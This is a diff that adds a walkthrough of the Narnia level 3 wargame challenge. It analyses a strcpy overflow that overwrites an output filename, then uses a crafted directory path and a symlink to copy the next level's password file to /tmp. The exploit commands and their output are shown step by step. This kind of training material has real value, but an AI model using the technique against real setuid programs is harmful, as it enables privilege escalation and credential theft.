@@ -1,0 +1,67 @@
+running the binary says: "./narnia3 file, will send contents of file 2 /dev/null"
+
+supplying /etc/narnia_pass/narnia4 says: "copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)"
+
+Looking at the disassembly of main shows
+
+    0x08048516 <+9>:	mov    DWORD PTR [esp+0x58],0x7665642f
+    0x0804851e <+17>:	mov    DWORD PTR [esp+0x5c],0x6c756e2f
+    0x08048526 <+25>:	mov    DWORD PTR [esp+0x60],0x6c
+    0x0804852e <+33>:	mov    DWORD PTR [esp+0x64],0x0
+
+These hex values look like printable ascii with a NULL terminator.
+
+0x7665642f = /dev
+0x6c756e2f = /nul
+0x6c       = l
+
+As expected, [esp + 0x58] points to "/dev/null" in a stack char[], below the rest of the function's stack.
+Our string is also copied using strcpy(). Let's break after it and see exactly what we're working with.
+
+    0xffffd5c0:	0xffffd5f8	0xffffd81b	0xffffd5e0	0x08048299
+    0xffffd5d0:	0x00000000	0xffffd674	0xf7fc7000	0x0000c287
+    0xffffd5e0:	0xffffffff	0x0000002f	0xf7e23dc8	0xf7fd51a8
+    0xffffd5f0:	0x00008000	0xf7fc7000	0x44444444	0xf7e2f300
+    0xffffd600:	0x00000002	0x00000000	0xf7e45830	0x080486bb
+    0xffffd610:	0x00000002	0xffffd6d4	0x7665642f	0x6c756e2f
+    0xffffd620:	0x0000006c	0x00000000	0x08048679	0x00000000
+    0xffffd630:	0xf7fc7000	0xf7fc7000	0x00000000	0xf7e2f637
+    0xffffd640:	0x00000002	0xffffd6d4	0xffffd6e0	0x00000000
+    0xffffd650:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
+    0xffffd660:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
+    0xffffd670:	0x00000000	0x2863b7a0	0x1224d9b0	0x00000000
+    0xffffd680:	0x00000000	0x00000000	0x00000002	0x08048410
+    0xffffd690:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
+    0xffffd6a0:	0x00000002	0x08048410	0x00000000	0x08048431
+    0xffffd6b0:	0x0804850d	0x00000002	0xffffd6d4	0x08048670
+
+Our stack dump shows 0xDDDD written at 0xffffd5f8. "/dev/null" is at $esp + 0x58, or 0xffffd618 here.
+Additionally, there's an entire empty word on the stack after "/dev/null", which looks to be part of
+the buffer. In other words:
+
+ifile                           |ofile
+DDDD____________________________|/dev/null_______
+
+is what we're working with, keeping in mind we need to leave one byte for our NULL terminator.
+
+If we write a string over /dev/null that's valid both as a global path as well as a local path from
+whatever we write before that, we should be able to write the contents of the first path to the second path.
+
+ifile                           |ofile
+/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA|/tmp/h4x0rz3d___
+
+Making a folder, /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA which contains another folder tmp/, which contains a symlink to
+/etc/narnia_pass/narnia4 named h4x0rz3d, should write the contents of this file to /tmp/h4x0rz3d. /tmp/h4x0rz3d
+will be need to be created by us and set to allow other users to write to, so that we can read it afterwards.
+
+    narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ls -l
+    total 0
+    lrwxrwxrwx 1 narnia3 narnia3 24 Sep 27 20:42 h4x0rz3d -> /etc/narnia_pass/narnia4
+
+    narnia3@narnia:/tmp$ ls -l h4x0rz3d
+    -rwxrwxrwx 1 narnia3 narnia3 0 Sep 27 20:42 h4x0rz3d
+
+    narnia3@narnia:/narnia$ ./narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/h4x0rz3d
+    copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/h4x0rz3d to a safer place... (/tmp/h4x0rz3d)
+
+    cat /tmp/h4x0rz3d
